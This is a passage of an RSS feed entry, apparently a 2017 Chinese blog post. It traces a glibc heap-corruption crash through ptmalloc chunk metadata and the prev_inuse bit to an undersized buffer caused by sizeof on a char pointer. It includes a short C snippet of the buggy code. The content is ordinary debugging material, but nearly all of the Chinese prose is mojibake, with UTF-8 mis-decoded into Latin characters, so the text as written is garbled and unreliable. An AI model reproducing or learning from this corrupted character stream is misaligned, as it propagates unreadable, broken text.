data-rawheight=&quot;154&quot;&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼ŒArgliståœ¨å†…å­˜åœ°å€0x7ffdead0b5f8å¤„ã€‚&lt;/p&gt;&lt;p&gt;ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œabortå‡½æ•°å…¶å®æ˜¯æ²¡æœ‰å‚æ•°çš„ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€å‘åçš„å†…å­˜åº”è¯¥ä½äºä¸Šä¸€å±‚å‡½æ•°çš„æ ˆå¸§å†…ã€‚æˆ‘ä»¬æ‰“å°ä¸€ä¸‹è¿™å—å†…å­˜çš„å†…å®¹çœ‹ä¸€ä¸‹é‡Œé¢éƒ½æœ‰å•¥ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c92c0029eebeb4be2b6a4a52af34fdaf_r.png&quot; data-rawwidth=&quot;425&quot; data-rawheight=&quot;155&quot;&gt;å¯ä»¥çœ‹åˆ°ï¼Œæ ˆä¸Šæœ‰ä¸€äº›çœ‹ä¸Šå»åƒæ˜¯æŒ‡é’ˆçš„å˜é‡ï¼ˆ64ä½ç³»ç»Ÿçš„æŒ‡é’ˆé•¿åº¦æ˜¯8å­—èŠ‚ï¼‰ï¼Œæˆ‘ä»¬å°è¯•ç€ä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¾“å‡ºä¸€ä¸‹è¿™å‡ ä¸ªï¼ˆçœ‹ä¸Šå»åƒæ˜¯æŒ‡é’ˆçš„ï¼‰æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å®¹ã€‚&lt;img src=&quot;https://pic2.zhimg.com/v2-238f3b5f5886c070e76f732974ad6181_r.png&quot; data-rawwidth=&quot;370&quot; data-rawheight=&quot;204&quot;&gt;&lt;p&gt;æœç„¶ï¼Œè¿™äº›æŒ‡é’ˆæŒ‡å‘äº†ä¸€äº›å­—ç¬¦ä¸²ï¼Œè€Œè¿™äº›å­—ç¬¦ä¸²æè¿°äº†freeå‡ºé”™æ—¶çš„é”™è¯¯ä¿¡æ¯ï¼šdouble free or corruption (!prev)ã€‚å®é™…ä¸Šï¼Œå¦‚æœè¯»è€…æœ‰å…´è¶£å»çœ‹ä¸€ä¸‹glibcï¼ˆGNU libcï¼‰çš„freeå‡½æ•°çš„å®ç°çš„è¯ï¼Œå°±å¯ä»¥å‘ç°glibcä¼šåœ¨æ‰§è¡Œfreeæ“ä½œæ—¶æ‰§è¡Œä¸€äº›å®Œæ•´æ€§æ£€æŸ¥ï¼Œå¦‚æœæ£€æŸ¥å¤±è´¥çš„è¯ï¼Œå°±ä¼šè¾“å‡ºä¸€äº›é”™è¯¯ä¿¡æ¯å¹¶è°ƒç”¨abortå‡½æ•°æ¥ç»ˆæ­¢ç¨‹åºã€‚åˆ°è¿™é‡Œï¼Œä¹Ÿè¿›ä¸€æ­¥éªŒè¯äº†æˆ‘ä»¬ä¹‹å‰çš„åˆ¤æ–­ï¼šæŸäº›ç”¨äºå®Œæ•´æ€§æ£€æŸ¥çš„æ•°æ®è¢«ç ´åäº†ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬æ¥çœ‹glibcæä¾›çš„å‡ºé”™ä¿¡æ¯ï¼šdouble free or corruption (!prev)ã€‚è¿™æç¤ºäº†ä¸¤ç§å‡ºé”™çš„å¯èƒ½æ€§ï¼Œç¬¬ä¸€ä¸ªæ˜¾ç„¶å°±æ˜¯double freeäº†ï¼Œå°±æ˜¯è¯´å¯¹åŒä¸€ä¸ªå†…å­˜åœ°å€æ‰§è¡Œäº†å¤šæ¬¡freeæ“ä½œã€‚æ ¹æ®ä¹‹å‰å¾—åˆ°çš„è°ƒè¯•ä¿¡æ¯ï¼ˆbtï¼‰ï¼Œæˆ‘ä»¬åœ¨ä»£ç å¯¹åº”çš„ä½ç½®å¹¶æ²¡æœ‰å‘ç°æœ‰double freeçš„å¯èƒ½æ€§ï¼Œæ‰€ä»¥é—®é¢˜æå¤§çš„å¯èƒ½ä»ç„¶æ˜¯å†…å­˜ç ´åå¼•èµ·çš„ã€‚&lt;/p&gt;&lt;p&gt;å¦‚æœçœŸçš„æ˜¯å†…å­˜ç ´åçš„è¯ï¼Œä¸Šé¢é‚£å¥é”™è¯¯ä¿¡æ¯çš„ååŠå¥å¯èƒ½ä¼šç»™æˆ‘ä»¬å¾ˆå¤§çš„å¸®åŠ©ã€‚æˆ‘ä»¬çŸ¥é“corruptionè¯´çš„è‡ªç„¶æ˜¯å†…å­˜ç ´åï¼Œé‚£ (!prev)åˆä»£è¡¨äº†ä»€ä¹ˆå‘¢ï¼Ÿä¸ºäº†è§£ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ·±å…¥glibcæ¥äº†è§£ä¸€ä¸‹malloc/freeç©¶ç«Ÿæ˜¯å¦‚ä½•ç®¡ç†å †å†…å­˜çš„ã€‚&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;glibcä¼šåœ¨freeå‡ºé”™æ—¶å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°syslogã€‚ä½†æ˜¯ç”±äºæŸäº›ç‰¹æ®Šçš„åŸå› ï¼Œæˆ‘ä»¬æ— æ³•åœ¨ç”Ÿäº§ç¯å¢ƒçš„æœºå™¨ä¸Šè·å–åˆ°è¿™éƒ¨åˆ†ä¿¡æ¯&lt;/blockquote&gt;&lt;h2&gt;0x40 å †å†…å­˜å¸ƒå±€&lt;/h2&gt;&lt;p&gt;glibcé‡‡ç”¨çš„æ˜¯ä¸€ä¸ªè¢«ç§°ä½œ&lt;a href=&quot;http://www.malloc.de/en/&quot; data-editable=&quot;true&quot; data-title=&quot;ptmalloc&quot;&gt;ptmalloc&lt;/a&gt;çš„å†…å­˜åˆ†é…å™¨ã€‚ç”±äºæˆ‘ä»¬å¹¶ä¸å…³å¿ƒptmallocæœ‰å…³å¤šçº¿ç¨‹æ€§èƒ½ä¼˜åŒ–çš„è®¾è®¡ï¼Œå› æ­¤æˆ‘ä»¬å¹¶ä¸éœ€è¦å»äº†è§£Arenaä»¥åŠä¸åŒçš„Binçš„å®ç°ç»†èŠ‚ï¼Œæˆ‘ä»¬åªéœ€è¦ç†è§£å†…å­˜åˆ†é…çš„åŸºæœ¬å•å…ƒï¼šå†…å­˜åŒºå—ï¼ˆMemory Chunkï¼‰å³å¯ã€‚åœ¨ptmallocçš„å®ç°ä¸­ï¼Œå†…å­˜åŒºå—é€šè¿‡ä¸€ç§è¢«ç§°ä½œBoundary Tagçš„æ–¹å¼ä¸²è”åœ¨ä¸€èµ·ï¼Œç›¸é‚»çš„åŒºå—ä¹‹é—´å½¢æˆä¸€ä¸ªç±»ä¼¼äºé“¾è¡¨çš„æ•°æ®ç»“æ„ã€‚Boundary Tagä¼šåœ¨ä¸€ä¸ªå†…å­˜åŒºå—çš„å¼€å¤´å’Œç»“å°¾éƒ½å­˜æ”¾ç€è¯¥ç‰‡å†…å­˜åŒºåŸŸçš„å¤§å°ï¼ˆæ³¨ï¼šç»“å°¾å¤„ä¹Ÿæœ‰å¯èƒ½å¹¶æ²¡æœ‰å­˜æ”¾å½“å‰åŒºå—çš„sizeä¿¡æ¯ï¼Œè¿™å–å†³äºå½“å‰åŒºå—çš„çŠ¶æ€ï¼Œè§åæ–‡ï¼‰ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯æ—¢å¯ä»¥å‘åéå†å„ä¸ªå†…å­˜åŒºå—ï¼Œåˆå¯ä»¥é€šè¿‡å­˜å‚¨åœ¨åŒºå—ä¹‹å‰çš„å‰ä¸€ä¸ªåŒºå—çš„sizeä¿¡æ¯å‘å‰éå†å„ä¸ªåŒºå—ã€‚ä¸€ä¸ªå†…å­˜åŒºå—çš„ç¤ºä¾‹å›¾å¦‚ä¸‹ã€‚&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9a05ec6b16d78361c65803834fb11ca2_r.png&quot; data-rawwidth=&quot;591&quot; data-rawheight=&quot;298&quot;&gt;&lt;p&gt;å¦‚æœå½“å‰çš„å†…å­˜åŒºå—å¤„äºå·²åˆ†é…çŠ¶æ€çš„è¯ï¼Œå°¾éƒ¨next chunkå¤„çš„sizeç”¨æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®ã€‚å¦‚æœå¤„äºæœªåˆ†é…çŠ¶æ€çš„è¯ï¼Œå°¾éƒ¨çš„sizeå­˜æ”¾çš„æ˜¯å½“å‰ï¼ˆå¯¹äºåä¸€ä¸ªå†…å­˜åŒºå—æ¥è¯´æ˜¯å‰ä¸€å—ï¼‰å†…å­˜åŒºå—çš„å¤§å°ã€‚è¿™æ ·åœ¨åˆå¹¶ç©ºé—²åŒºå—æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡prev_sizeè¿™ä¸ªå­—æ®µæ‰¾åˆ°å‰ä¸€ä¸ªç©ºé—²åŒºå—çš„èµ·å§‹ä½ç½®ï¼Œä»è€Œå®ç°åˆå¹¶æ“ä½œã€‚ä¸€æ®µè¿ç»­çš„å†…å­˜åŒºå—å®ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆæ³¨ï¼šå®é™…çš„å®ç°å¯èƒ½ä¼šæœ‰ä¸åŒï¼‰ï¼š&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ec9b51e9a85808e8b59bbda4f1e73f3c_r.png&quot; data-rawwidth=&quot;1270&quot; data-rawheight=&quot;443&quot;&gt;ç”±äºå†…å­˜åˆ†é…é€šå¸¸æŒ‰ä¸€å®šæ–¹å¼ï¼ˆä¾‹å¦‚æŒ‰16å­—èŠ‚ï¼‰è¿›è¡Œå­—èŠ‚å¯¹é½ï¼Œå› æ­¤sizeå­—æ®µçš„ä½å‡ ä½ï¼ˆè·Ÿå¹³å°å’Œå®ç°ç›¸å…³ï¼‰æ°¸è¿œæ˜¯0ã€‚å› æ­¤ptmallocåˆ©ç”¨è¿™ä¸ªå‡ ä¸ªä½æ¥å­˜æ”¾ä¸€äº›é¢å¤–çš„ä¿¡æ¯ã€‚å…¶ä¸­Pä½ï¼ˆé€šå¸¸æ˜¯æœ€ä½ä½ï¼‰ç”¨æ¥æ ‡è¯†å‰ä¸€ä¸ªå†…å­˜åŒºå—æ˜¯å¦å¤„äºå·²åˆ†é…çŠ¶æ€(prev_inuse)ã€‚åˆ©ç”¨è¿™ä¸ªä¿¡æ¯ï¼Œåœ¨é‡Šæ”¾å†…å­˜æ—¶ï¼Œå¦‚æœå‘ç°å‰ä¸€ä¸ªåŒºå—å¤„äºç©ºé—²çŠ¶æ€ï¼Œå°±å¯ä»¥å°†ä¸¤ä¸ªåŒºå—åˆå¹¶æˆä¸ºä¸€ä¸ªæ›´å¤§çš„åŒºå—ï¼Œä»è€Œå‡å°‘å†…å­˜ç¢ç‰‡çš„äº§ç”Ÿã€‚åŒæ—¶ï¼Œptmallocä¹Ÿå¯ä»¥åœ¨é‡Šæ”¾å†…å­˜æ—¶æ£€æŸ¥è¿™ä¸ªä½ç½®çš„å€¼æ˜¯å¦æ˜¯æ­£ç¡®çš„ï¼šé¦–å…ˆï¼Œå½“å‰æ­£åœ¨é‡Šæ”¾çš„å†…å­˜åŒºå—æ˜¾ç„¶æ˜¯å¤„äºinuseçŠ¶æ€çš„ï¼›å¦‚æœåä¸€ä¸ªåŒºå—çš„Pä½æ˜¯0çš„è¯ï¼Œåˆ™è¡¨ç¤ºå½“å‰åŒºå—å¤„äºç©ºé—²çŠ¶æ€ã€‚å³å¯¹å½“å‰åŒºå—çš„çŠ¶æ€çš„è®¤è¯†ä¸Šï¼Œå‰åä¸¤ä¸ªåŒºå—äº§ç”Ÿäº†åˆ†æ­§ã€‚å¦‚æœä¸æ˜¯ä¸¤æ¬¡å¯¹åŒä¸€å—å†…å­˜è°ƒç”¨äº†freeçš„è¯ï¼Œè¿™åªèƒ½è¯´æ˜åä¸€ä¸ªåŒºå—çš„çŠ¶æ€ä½æœ‰å¯èƒ½å·²ç»è¢«å†™å…¥äº†éæ³•å€¼ï¼Œäº¦å³ï¼Œåä¸€ä¸ªåŒºå—çš„å†…å®¹å·²ç»è¢«ç ´åäº†ã€‚è€Œè¿™ä¹Ÿå°±æ˜¯é”™è¯¯ä¿¡æ¯ä¸­!prevçš„å«ä¹‰ã€‚glibcä¸­è¿™ä¸ªå®Œæ•´æ€§æ£€æŸ¥éƒ¨åˆ†çš„ä»£ç å¤§æ¦‚æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ï¼š&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;if (!prev_inuse(nextchunk)) {
    errstr = &quot;double free or corruption (!prev)&quot;;
    goto errout;
} &lt;/code&gt;&lt;h2&gt;0x50 æŸ¥çœ‹è¢«ç ´åçš„å†…å­˜&lt;/h2&gt;&lt;p&gt;æ—¢ç„¶çŸ¥é“é—®é¢˜æœ‰å¯èƒ½æ˜¯ç”±äºåä¸€ä¸ªåŒºå—è¢«éæ³•æ•°æ®ç ´åæ‰€å¼•èµ·çš„ï¼Œé‚£æˆ‘ä»¬å¹²è„†å°±æ¥çœ‹ä¸€ä¸‹åä¸€ä¸ªåŒºå—çš„æ•°æ®è¢«ç ´åæˆäº†ä»€ä¹ˆæ ·å­ã€‚æ ¹æ®ä¸Šä¸€èŠ‚å¯¹mallocçš„ä»‹ç»ï¼Œè¦æ‰¾åˆ°åä¸€ä¸ªåŒºå—çš„ä½ç½®ï¼Œåªéœ€è¦æ‰¾åˆ°å½“å‰åŒºå—çš„èµ·å§‹ä½ç½®å’Œå¤§å°ï¼Œè€Œå¤§å°å¯ä»¥é€šè¿‡sizeå­—æ®µæ‰¾åˆ°ï¼šåªéœ€è¦çœ‹ä¸€ä¸‹freeçš„å‚æ•°å‘å‰ä¸€ä¸ªå­—é•¿å¤„çš„å†…å­˜å³å¯ã€‚æ ¹æ®è°ƒç”¨å †æ ˆï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“freeçš„å‚æ•°æ˜¯0x1043500ï¼Œé‚£æˆ‘ä»¬å°±å»çœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€ä¹‹å‰çš„mallocå…ƒæ•°æ®ã€‚&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5faadcf15f091bc2c22fcf1ef9e337ba_r.png&quot; data-rawwidth=&quot;419&quot; data-rawheight=&quot;155&quot;&gt;å¦‚å›¾ä¸­ï¼Œ0x1043500æ˜¯ä¼ é€’ç»™freeçš„å‚æ•°ã€‚ç”±äºæˆ‘ä»¬çš„ç¨‹åºåœ¨mallocåŸºç¡€ä¸Šå®ç°äº†è‡ªå·±çš„å†…å­˜ç®¡ç†ï¼Œåœ¨å†…å­˜åŒºå—å‰å¢åŠ äº†é¢å¤–0x20ä¸ªå­—èŠ‚ï¼ˆåœ¨64ä½PCä¸Šï¼‰çš„å†…å­˜å ç”¨ã€‚å› æ­¤mallocçš„sizeå­—æ®µå°±ä½äºåœ°å€0x1043500-0x20-0x08 = 0x10434d8å¤„ï¼Œå¹¶ä¸”ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œsizeå­—æ®µçš„å€¼æ˜¯0x1031ã€‚å»æ‰æœ€ä½ä½çš„Pä½ä¿¡æ¯åï¼ˆåœ¨è¯¥ç¤ºä¾‹ä¸­ï¼ŒPä½çš„å€¼æ˜¾ç„¶æ˜¯1ã€‚å¦å¤–è¿˜æœ‰Mä½å’ŒAä½ï¼Œåœ¨è¯¥ç¤ºä¾‹ä¸­éƒ½æ˜¯0ï¼‰ï¼Œæˆ‘ä»¬ç®—å¾—è¯¥å†…å­˜åŒºå—çš„å®é™…å¤§å°æ˜¯0x1030å­—èŠ‚ã€‚å°±æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®å½“å‰å†…å­˜åŒºå—çš„èµ·å§‹åœ°å€å’Œå¤§å°æ¥å®šä½åä¸€ä¸ªå†…å­˜åŒºå—çš„ä½ç½®äº†ï¼Œä¹Ÿå°±æ˜¯0x10434d8+0x1030å¤„ã€‚æ ¹æ®å‰é¢çš„è¯´æ˜ï¼Œè¿™ä¸ªåœ°å€å¤„å­˜æ”¾çš„åº”å½“æ˜¯åä¸€ä¸ªå†…å­˜åŒºå—çš„sizeå­—æ®µã€‚ç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹å®ƒçš„å€¼ç©¶ç«Ÿæ˜¯å¤šå°‘ã€‚&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-630226041666af7d970fcb236887c2b0_r.png&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;153&quot;&gt;æˆ‘ä»¬çœ‹åˆ°ï¼Œæœ¬æ¥åº”å½“æ˜¯å­˜æ”¾sizeå­—æ®µçš„ä½ç½®å˜æˆäº†ç–‘ä¼¼æ˜¯å­—ç¬¦ä¸²çš„å€¼ï¼ˆåœ°å€0x1044508å¤„ï¼‰ã€‚è€Œä¸”æ¯«æ— ç–‘é—®ï¼ŒPä½çš„å€¼æœç„¶æ˜¯0ï¼ˆä¹Ÿå°±æ˜¯è¯´å®ƒè®¤ä¸ºå‰ä¸€ä¸ªåŒºå—å¹¶æœªå¤„äºinuseçŠ¶æ€ï¼‰ã€‚è¿™å°±æ˜¯freeæ—¶æŠ¥é”™çš„ç›´æ¥åŸå› ã€‚æˆ‘ä»¬æŠŠå­—ç¬¦ä¸²æ‰“å°å‡ºæ¥çœ‹ä¸€ä¸‹è¿™æ®µæ•°æ®ç©¶ç«Ÿæ˜¯ä»€ä¹ˆã€‚&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-33531289c8bcb7d34bff3d61f581b55d_r.png&quot; data-rawwidth=&quot;308&quot; data-rawheight=&quot;36&quot;&gt;&lt;p&gt;çœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸²å­—ç¬¦ä¸²â€™0â€™å’Œé€—å·ä¹‹ç±»çš„ä¸œè¥¿ï¼Œè€Œä¸”ç¬”è€…æ•¢å¯¹ç¯å‘èª“è¿™ç»å¯¹ä¸æ˜¯åˆæ³•çš„sizeå€¼ï¼ˆå¦åˆ™å†…å­˜å¾—æœ‰å¤šå¤§ã€‚ã€‚ï¼‰ã€‚æœ‰äº†å…·ä½“çš„æ•°æ®ï¼Œå°±å¯ä»¥æ ¹æ®å…¶å†…å®¹åˆ°ç¨‹åºæºä»£ç ä¸­å»æŸ¥æ‰¾ç©¶ç«Ÿå“ªä¸€éƒ¨åˆ†ä»£ç æœ‰å¯èƒ½å‘å†…å­˜ä¸­å†™å…¥è¿™æ ·çš„æ•°æ®ã€‚é€šè¿‡æ£€æŸ¥ç¨‹åºæºä»£ç ï¼Œæœ€ç»ˆè¯æ˜è¿™æ˜¯ä¸€ä¸ªjsonå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚åˆæ ¹æ®å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œæˆ‘ä»¬æœ€ç»ˆå®šä½åˆ°äº†å¯¹åº”çš„æºä»£ç çš„ä½ç½®ã€‚&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x60 é—®é¢˜çœŸç›¸&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€æ®µç¤ºä¾‹ä»£ç ï¼Œå…¶ä¸­åŒ…å«äº†å¯¼è‡´è¯¥é—®é¢˜çš„BUGï¼ˆå»æ‰äº†æ— å…³çš„è¿”å›å€¼æ£€æŸ¥ç­‰ï¼‰ã€‚&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;// ä¸€æ®µæœ‰é—®é¢˜çš„ä»£ç 
const char *fmt = &quot;this is fmt: %s, blabla...&quot;;
...
char *data, *other_data;
size_t data_len, other_data_len;
...
size_t expected_len = (sizeof(fmt)-1-2) + data_len + other_data_len;
char *buf = alloc_memory(expected_len);
buf += snprintf(buf, expected_len, fmt, data);
memcpy(buf, other_data, other_data_len);
&lt;/code&gt;ä½ èƒ½ä¸€çœ¼çœ‹å‡ºé—®é¢˜æ‰€åœ¨ä¹ˆï¼Ÿé—®é¢˜å°±åœ¨äºï¼Œåœ¨è®¡ç®—expected_lenæ—¶ï¼Œä»£ç ä½¿ç”¨sizeofæ¥è®¡ç®—å­—ç¬¦ä¸²fmtçš„é•¿åº¦ã€‚ä½†æ˜¯è¦çœ‹æ¸…æ¥šï¼Œfmtçš„ç±»å‹æ˜¯ä¸€ä¸ª &quot;char *&quot; è€Œä¸æ˜¯ &quot;char []&quot; ï¼ï¼ï¼å¦‚æœæ˜¯char *çš„è¯ï¼Œsizeofè®¡ç®—å‡ºæ¥çš„åªæ˜¯ä¸€ä¸ªæŒ‡é’ˆçš„é•¿åº¦ï¼ˆ64ä½ç³»ç»Ÿä¸Šæ˜¯8å­—èŠ‚ï¼‰ï¼Œè¿™å°±å¯¼è‡´è®¡ç®—å¾—åˆ°çš„expected_lenå°äºå®é™…æ‰€éœ€çš„å†…å­˜ã€‚ç”±äºç¨‹åºè‡ªèº«çš„å†…å­˜ç®¡ç†ä¼šåœ¨å†…å­˜åˆ†é…æ—¶è¿›è¡Œå¯¹é½ï¼ˆå¯¹äºå°å†…å­˜åŒºå—ï¼Œå¯¹é½åˆ°2çš„æ•´æ•°æ¬¡å¹‚ï¼‰ï¼Œå¯¼è‡´å¤§å¤šæ•°æƒ…å†µä¸‹å¯¹é½ä¹‹åå¤šå‡ºæ¥çš„éƒ¨åˆ†å¤§äºå°‘è®¡ç®—çš„é‚£éƒ¨åˆ†ï¼Œä»è€Œå¹¶ä¸ä¼šåœ¨æ¯æ¬¡æ‰§è¡Œæ—¶éƒ½å¯¼è‡´å´©æºƒï¼Œå› è€Œå‡ºç°äº†ä¸€å®šçš„éšæœºæ€§ï¼Œæé«˜äº†é—®é¢˜æ’æŸ¥çš„éš¾åº¦ã€‚&lt;h2&gt;0x70 æ€»ç»“&lt;/h2&gt;&lt;p&gt;æœ¬ç¯‡æ–‡ç« ä»‹ç»äº†ä¸€æ¬¡å†…å­˜ç ´åçš„æ’æŸ¥è¿‡ç¨‹ï¼Œåœ¨ç†è§£äº†glibcæ˜¯å¦‚ä½•ç®¡ç†å†…å­˜çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®æ”¶é›†åˆ°çš„ä¸€ç‚¹çº¿ç´¢ï¼Œå¯ä»¥å®šä½åˆ°å‡ºç°é—®é¢˜çš„ä»£ç ï¼Œä»è€Œé™¤æ‰BUGã€‚æ‰€ä»¥ï¼ŒæŸ¥BUGçš„è¿‡ç¨‹ä¸­æœ€é‡è¦çš„æ˜¯å•¥å‘¢ï¼Ÿé‚£å½“ç„¶æ˜¯å†™ä»£ç è¦è®¤çœŸï¼Œä¸è¦å†™å‡ºBUGå•Šï¼ä¸å¤šè¯´äº†ï¼Œç¬”è€…è¦å»å‘BUGçº¢åŒ…äº†ã€‚ã€‚ã€‚æˆ‘ä»¬ä¸‹å›å†è§ã€‚&lt;/p&gt;&lt;h2&gt;0x80 å‚è€ƒæ–‡çŒ®&lt;/h2&gt;1. &lt;a href=&quot;https://www.gnu.org/software/libc/libc.html&quot; data-editable=&quot;true&quot; data-title=&quot;The GNU C Library&quot; class=&quot;&quot;&gt;The GNU C Library&lt;/a&gt;&lt;p&gt;2. &lt;a href=&quot;https://github.com/emeryberger/Malloc-Implementations&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Malloc-Implementations&quot;&gt;Malloc-Implementations&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;3. &lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Understanding glibc malloc&quot;&gt;Understanding glibc malloc&lt;/a&gt;&lt;/p&gt;</description>
<author>Jinzhao Liu</author>
<guid isPermaLink="false">2017-05-12-26815897</guid>
<pubDate>Fri, 12 May 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
